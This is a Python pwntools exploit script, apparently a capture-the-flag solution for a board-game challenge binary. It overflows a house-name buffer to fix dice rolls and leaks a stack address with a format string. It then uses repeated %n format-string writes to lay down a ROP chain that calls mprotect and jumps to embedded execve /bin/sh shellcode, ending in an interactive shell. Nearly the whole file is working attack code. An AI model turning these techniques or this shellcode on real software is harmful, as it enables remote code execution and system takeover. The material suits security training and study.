from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

LOCAL = 0
if LOCAL:
    p = process('../src/chall')
else:
    p = remote('localhost', 9999)

def addDiceSeed():
    global diceSeed
    diceSeed += 1
    diceSeed %= 12

def getDiceBytes(target):
    global diceSeed
    x = bytes_to_long(b'AAAA')
    while True:
        res = (((x % 12) + diceSeed) % 12) + 1
        if (res == target):
            return p32(x)
        x += 1

diceSeed = 0

def setDice(target, reset_jail = False):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'(1/0): ')
    p.sendline(b'1')
    if (reset_jail):
        p.sendline(b'2')
    else:
        p.sendline(b'1')
    payload = b'A' * 28
    payload += getDiceBytes(target)
    if (reset_jail):
        payload += b'A' * (39 - len(payload))
    p.sendline(payload)
    addDiceSeed()

def nextTurn():
    p.recvuntil(b'> ')
    p.sendline(b'1')
    addDiceSeed()

def freePark(target):
    p.recvuntil(b': ')
    p.sendline((str(target)).encode())

# computer move first
p.recvuntil(b'> ')
p.sendline(b'1')
res = p.recvuntil(b'.')
computer_move = int(res[16:-1].decode())
assert computer_move < 10 # so we can send it to jail
addDiceSeed()

# our first move, we should buy a house here to control the dice
# it will take some tries to get a house
p.recvuntil(b'> ')
p.sendline(b'1')
res = p.recvuntil(b'.')
our_move = int(res[11:-1].decode())
assert our_move in [1, 3, 6, 8, 9] # houses we can buy
p.recvuntil(b'(1/0): ')
p.sendline(b'1')
addDiceSeed()

# we can control the dice if we give name to our house
# byte 29-32 of our house name can be set as our dice number
# adjust with getDiceNumber() formula

# set dice number for computer to go to jail
setDice(10 - computer_move)
nextTurn()

# go to jail
# leak stack area
setDice(10 - our_move)
nextTurn()

payload = b'%16$lx'
p.recvuntil(b'> ')
p.sendline(payload)
stack_leak = p.recvuntil(b'\n\n').split(b': ')[-1][:-2]
stack_leak = int(stack_leak.decode(), 16)

# we need to go to jail again
# we can buy the last house, and give it a name with length 39,
# and then the inJailCnt[0] will be set to 0 because of strcpy
# but, at this point we need money

# we can get enough money if we go to start line, jail, and free parking for a number of times
# start line = +200
# jail = -150
# in one round, we can get +50
# just do the some optimal move for computer. it should not lose too.

for i in range(10):
    # computer
    setDice(11)
    nextTurn()

    # us
    setDice(10)
    nextTurn()
    freePark(19)

    # computer
    setDice(11)
    nextTurn()

    # us
    setDice(10)
    nextTurn()

    # computer
    setDice(8)
    nextTurn()

    # us
    setDice(10)
    nextTurn()
    freePark(19)

    # computer
    setDice(10)
    nextTurn()

    # us
    setDice(10)
    nextTurn()

# computer
setDice(11)
nextTurn()

# buy the last house
setDice(10)
nextTurn()
freePark(18)
p.recvuntil(b'(1/0): ')
p.sendline(b'1')

# computer
setDice(10)
nextTurn()

# us, go to jail
setDice(11, True)
nextTurn()

# first, it will be just a dummy, so we can repeat it numerous times
payload = b'AAAA'
p.sendline(payload)

def prepare():
    # computer
    setDice(10)
    nextTurn()

    # us, go to jail
    setDice(10, True)
    nextTurn()
    freePark(29)

def write_rop_chain(what, where):
    prepare()
    print('write', hex(what), 'in', hex(where))
    if (what == 0):
        payload = b'%13$ln'
    else:
        payload = b'%'
        payload += (str(what)).encode()
        payload += b'x%13$ln'
    payload += b'A' * (56 - len(payload))
    payload += p64(where)
    p.sendline(payload)    

# ret2mprotect + shellcode
mprotect = 0x000000000044df60
pop_rdi = 0x00000000004006c6
pop_rdx_pop_rsi = 0x000000000044f729
print('stack_leak =', hex(stack_leak))
rbp = stack_leak - 0x40
param_1 = (rbp // 4096) * 4096 #address to make executable, should be a multiple of PAGE_SIZE
param_2 = 1000 #length, set to something
param_3 = 7 #protection, set to 7 (rwx)
shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05' # from shell-storm

# param_1
for i in range(6):
    write_rop_chain((param_1 & ((1 << (8 * (i + 1))) - 1)) >> (8 * i), rbp + 0x60 + i)

# pop_rdx_pop_rsi
for i in range(3):
    write_rop_chain((pop_rdx_pop_rsi & ((1 << (8 * (i + 1))) - 1)) >> (8 * i), rbp + 0x68 + i)

# param_3
for i in range(1):
    write_rop_chain((param_3 & ((1 << (8 * (i + 1))) - 1)) >> (8 * i), rbp + 0x70 + i)

# param_2
for i in range(2):
    write_rop_chain((param_2 & ((1 << (8 * (i + 1))) - 1)) >> (8 * i), rbp + 0x78 + i)

# mprotect
for i in range(3):
    write_rop_chain((mprotect & ((1 << (8 * (i + 1))) - 1)) >> (8 * i), rbp + 0x80 + i)

# address of shellcode
for i in range(6):
    write_rop_chain(((rbp - 0x50 + 17) & ((1 << (8 * (i + 1))) - 1)) >> (8 * i), rbp + 0x88 + i)

# there is some unwanted byte at rbp + 0x6c, so we should rewrite it
# pop_rdi
prepare()
payload = b'%12$n%'
payload += (str(pop_rdi & 0xFFFF)).encode()
payload += b'x%13$hn'
payload += shellcode
payload += b'A' * (48 - len(payload))
payload += p64(rbp + 0x6c)
payload += p64(rbp + 0x58)
p.sendline(payload)    

# profit
p.interactive()